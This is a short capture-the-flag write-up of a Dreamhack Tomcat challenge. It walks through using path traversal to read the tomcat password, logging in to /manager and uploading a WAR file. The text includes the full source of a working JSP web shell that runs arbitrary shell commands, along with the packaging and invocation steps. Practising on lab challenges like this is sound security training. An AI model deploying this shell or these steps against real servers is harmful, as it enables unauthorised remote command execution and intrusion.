---
created: 2026-05-10
tags:
  - note
  - journal
  - cyberStuff
  - dreamhack
title: manager-tomcat
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-09T12:25:22.156Z
---
Access the site for the first time:\
![](/images/static/Pasted%20image%2020260510064219.png)\
Look at the image source:\
![](/images/static/Pasted%20image%2020260510064234.png)\
Looks like LFI; do some path traversal in Burp and get the password of user tomcat:\
![](/images/static/Pasted%20image%2020260510060750.png)\
Log in with the password at /manager:\
![](/images/static/Pasted%20image%2020260510065249.png)\
Inside, we get a file upload menu; the file needs to be in .war format.

Create shell:

```

nano shell.jsp

COPY-PASTE THIS

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>

SAVE EXIT 

zip exploit.war shell.jsp A
```

Now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag:\
![](/images/static/Pasted%20image%2020260510064024.png)
